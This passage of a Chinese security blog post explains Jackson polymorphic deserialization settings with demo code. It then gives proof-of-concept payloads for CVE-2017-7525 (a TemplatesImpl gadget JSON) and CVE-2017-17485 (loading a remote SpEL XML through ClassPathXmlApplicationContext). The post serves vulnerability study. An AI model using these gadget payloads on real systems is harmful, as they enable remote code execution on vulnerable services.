<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        stu.sex = <span class="keyword">new</span> MySex();</span><br><span class="line"></span><br><span class="line">        Teacher[] teachers= <span class="keyword">new</span> Teacher[<span class="number">2</span>];</span><br><span class="line">        teachers[<span class="number">0</span>]=<span class="keyword">new</span> Teacher();</span><br><span class="line">        teachers[<span class="number">1</span>]=<span class="keyword">new</span> Teacher();</span><br><span class="line">        stu.object = teachers;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建ObjectMapper对象</span></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置OBJECT_AND_NON_CONCRETE</span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">//&#123;&quot;age&quot;:20,&quot;name&quot;:&quot;shadowtest&quot;,&quot;object&quot;:[&quot;[Ljackson.Teacher;&quot;,[&#123;&quot;length&quot;:100&#125;,&#123;&quot;length&quot;:100&#125;]],&quot;sex&quot;:[&quot;jackson.MySex&quot;,&#123;&quot;sex&quot;:0&#125;]&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//age=20, name=shadowtest, [Ljackson.Teacher;@26653222</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s, %s&quot;</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Teacher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySex</span> <span class="keyword">implements</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对数组进行反序列化了</p>
<h4 id="3-2-4-NON-FINAL"><a href="#3-2-4-NON-FINAL" class="headerlink" title="3.2.4 NON_FINAL"></a>3.2.4 NON_FINAL</h4><p>除了前面的所有特征外，包含即将被序列化的类里的全部、非final的属性，也就是相当于整个类、除final外的属性信息都需要被序列化和反序列化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        stu.sex = <span class="keyword">new</span> MySex();</span><br><span class="line"></span><br><span class="line">        Teacher[] teachers= <span class="keyword">new</span> Teacher[<span class="number">2</span>];</span><br><span class="line">        teachers[<span class="number">0</span>]=<span class="keyword">new</span> Teacher();</span><br><span class="line">        teachers[<span class="number">1</span>]=<span class="keyword">new</span> Teacher();</span><br><span class="line">        stu.object = teachers;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建ObjectMapper对象</span></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置OBJECT_AND_NON_CONCRETE</span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">//[&quot;jackson.Student&quot;,&#123;&quot;age&quot;:20,&quot;name&quot;:&quot;shadowtest&quot;,&quot;object&quot;:[&quot;[Ljackson.Teacher;&quot;,[[&quot;jackson.Teacher&quot;,&#123;&quot;length&quot;:100&#125;],[&quot;jackson.Teacher&quot;,&#123;&quot;length&quot;:100&#125;]]],&quot;sex&quot;:[&quot;jackson.MySex&quot;,&#123;&quot;sex&quot;:0&#125;]&#125;]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//age=20, name=shadowtest, [Ljackson.Teacher;@26653222</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s, %s&quot;</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Teacher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySex</span> <span class="keyword">implements</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-2-5-总结"><a href="#3-2-5-总结" class="headerlink" title="3.2.5 总结"></a>3.2.5 总结</h4><p>DefaultTyping的几个设置选项是逐渐扩大适用范围的，如下表：</p>
<table>
<thead>
<tr>
<th align="left">DefaultTyping类型</th>
<th align="left">描述说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">JAVA_LANG_OBJECT</td>
<td align="left">属性的类型为Object</td>
</tr>
<tr>
<td align="left">OBJECT_AND_NON_CONCRETE</td>
<td align="left">属性的类型为Object、Interface、AbstractClass</td>
</tr>
<tr>
<td align="left">NON_CONCRETE_AND_ARRAYS</td>
<td align="left">属性的类型为Object、Interface、AbstractClass、Array</td>
</tr>
<tr>
<td align="left">NON_FINAL</td>
<td align="left">所有除了声明为final之外的属性</td>
</tr>
</tbody></table>
<h3 id="3-2-JsonTypeInfo注解"><a href="#3-2-JsonTypeInfo注解" class="headerlink" title="3.2 @JsonTypeInfo注解"></a>3.2 @JsonTypeInfo注解</h3><p>@JsonTypeInfo注解是Jackson多态类型绑定的一种方式，支持下面5种类型的取值：</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="variable">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.NONE)</span><br><span class="line"><span class="variable">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.CLASS)</span><br><span class="line"><span class="variable">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span><br><span class="line"><span class="variable">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.NAME)</span><br><span class="line"><span class="variable">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.COSTOM)</span><br></pre></td></tr></table></figure>



<h4 id="3-2-1-JsonTypeInfo-Id-NONE"><a href="#3-2-1-JsonTypeInfo-Id-NONE" class="headerlink" title="3.2.1 JsonTypeInfo.Id.NONE"></a>3.2.1 JsonTypeInfo.Id.NONE</h4><p>设置@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)注解和不设置注解是一样的</p>
<p>不设置注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonTypeInfo;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        stu.object = <span class="keyword">new</span> Boy();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建ObjectMapper对象</span></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">//&#123;&quot;age&quot;:20,&quot;name&quot;:&quot;shadowtest&quot;,&quot;object&quot;:&#123;&quot;length&quot;:100&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//age=20, name=shadowtest, &#123;length=100&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="comment">//@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)</span></span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s, %s&quot;</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>设置注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonTypeInfo;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        stu.object = <span class="keyword">new</span> Boy();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建ObjectMapper对象</span></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">//&#123;&quot;age&quot;:20,&quot;name&quot;:&quot;shadowtest&quot;,&quot;object&quot;:&#123;&quot;length&quot;:100&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//age=20, name=shadowtest, &#123;length=100&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)</span></span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s, %s&quot;</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="3-2-2-JsonTypeInfo-Id-CLASS"><a href="#3-2-2-JsonTypeInfo-Id-CLASS" class="headerlink" title="3.2.2 JsonTypeInfo.Id.CLASS"></a>3.2.2 JsonTypeInfo.Id.CLASS</h4><p>JsonTypeInfo.Id.CLASS注解，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonTypeInfo;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        stu.object = <span class="keyword">new</span> Boy();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建ObjectMapper对象</span></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">//&#123;&quot;age&quot;:20,&quot;name&quot;:&quot;shadowtest&quot;,&quot;object&quot;:&#123;&quot;@class&quot;:&quot;jackson.Boy&quot;,&quot;length&quot;:100&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//age=20, name=shadowtest, jackson.Boy@3bfdc050</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</span></span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s, %s&quot;</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将关联的类也给序列化了</p>
<h4 id="3-2-3-JsonTypeInfo-Id-MINIMAL-CLASS"><a href="#3-2-3-JsonTypeInfo-Id-MINIMAL-CLASS" class="headerlink" title="3.2.3 JsonTypeInfo.Id.MINIMAL_CLASS"></a>3.2.3 JsonTypeInfo.Id.MINIMAL_CLASS</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonTypeInfo;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        stu.object = <span class="keyword">new</span> Boy();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建ObjectMapper对象</span></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">//&#123;&quot;age&quot;:20,&quot;name&quot;:&quot;shadowtest&quot;,&quot;object&quot;:&#123;&quot;@c&quot;:&quot;jackson.Boy&quot;,&quot;length&quot;:100&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//age=20, name=shadowtest, jackson.Boy@5e3a8624</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span></span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s, %s&quot;</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看见@class变成了@c，缩短了相关类名</p>
<h4 id="3-2-4-JsonTypeInfo-Id-NAME"><a href="#3-2-4-JsonTypeInfo-Id-NAME" class="headerlink" title="3.2.4 JsonTypeInfo.Id.NAME"></a>3.2.4 JsonTypeInfo.Id.NAME</h4><p>序列化为</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;age&quot;</span>:<span class="number">20</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;shadowtest&quot;</span>,<span class="attr">&quot;object&quot;</span>:&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;Boy&quot;</span>,<span class="attr">&quot;length&quot;</span>:<span class="number">100</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>没有具体的包名在内的类名，因此在后面的反序列化的时候会报错，也就是说这个设置值是不能被反序列化利用的。</p>
<h4 id="3-2-5-JsonTypeInfo-Id-CUSTOM"><a href="#3-2-5-JsonTypeInfo-Id-CUSTOM" class="headerlink" title="3.2.5 JsonTypeInfo.Id.CUSTOM"></a>3.2.5 JsonTypeInfo.Id.CUSTOM</h4><p>其实这个值时提供给用户自定义的意思，我们是没办法直接使用的，需要手动写一个解析器才能配合使用，直接运行会抛出异常：</p>
<h3 id="3-3-反序列总结"><a href="#3-3-反序列总结" class="headerlink" title="3.3 反序列总结"></a>3.3 反序列总结</h3><p>所以按照上述分析，3种情况下可以触发Jackson反序列化漏洞</p>
<p>1、enableDefaultTyping()</p>
<p>2、@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</p>
<p>3、@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</p>
<h2 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4. 漏洞利用"></a>4. 漏洞利用</h2><h3 id="4-1-CVE-2017-7525（基于TemplatesImpl利用链）"><a href="#4-1-CVE-2017-7525（基于TemplatesImpl利用链）" class="headerlink" title="4.1 CVE-2017-7525（基于TemplatesImpl利用链）"></a>4.1 CVE-2017-7525（基于TemplatesImpl利用链）</h3><h3 id="环境限制"><a href="#环境限制" class="headerlink" title="环境限制"></a>环境限制</h3><p>Jackson 2.6系列 &lt; 2.6.7.1</p>
<p>Jackson 2.7系列 &lt; 2.7.9.1</p>
<p>Jackson 2.8系列 &lt; 2.8.8.1</p>
<p>JDK版本</p>
<p>POC </p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;object&quot;</span>:[</span><br><span class="line">        <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;transletBytecodes&quot;</span>:[<span class="string">&quot;xxx&quot;</span>],</span><br><span class="line">            <span class="attr">&quot;transletName&quot;</span>:<span class="string">&quot;test&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;outputProperties&quot;</span>:&#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里解释下设置的几个JSON键值对：</p>
<ul>
<li>transletBytecodes——Base64编码的Exploit恶意类的字节流，编码原因可参考之前的Fastjson系列；</li>
<li>transletName——TemplatesImpl类对象的_name属性值；</li>
<li>outputProperties——为的是能够成功调用setOutputProperties()函数，该函数是outputProperties属性的setter方法，在Jackson反序列化时会被自动调用；</li>
</ul>
<h3 id="4-2-CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）"><a href="#4-2-CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）" class="headerlink" title="4.2 CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）"></a>4.2 CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</h3><p>Jackson 2.7系列 &lt; 2.7.9.2</p>
<p>Jackson 2.8系列 &lt; 2.8.11</p>
<p>Jackson 2.9系列 &lt; 2.9.4</p>
<p>不受JDK限制，可直接在JDK1.8上运行。</p>
<p>利用链是基于org.springframework.context.support.ClassPathXmlApplicationContext类，利用的原理就是SpEL表达式注入漏洞。</p>
<p>POC</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoC</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//CVE-2017-17485</span></span><br><span class="line">        String payload = <span class="string">&quot;[\&quot;org.springframework.context.support.ClassPathXmlApplicationContext\&quot;, \&quot;http://127.0.0.1:8000/spel.xml\&quot;]&quot;</span>;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            mapper.readValue(payload, Object.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://fynch3r.github.io/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/">https://fynch3r.github.io/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/</a></li>
<li></li>
</ul>
]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
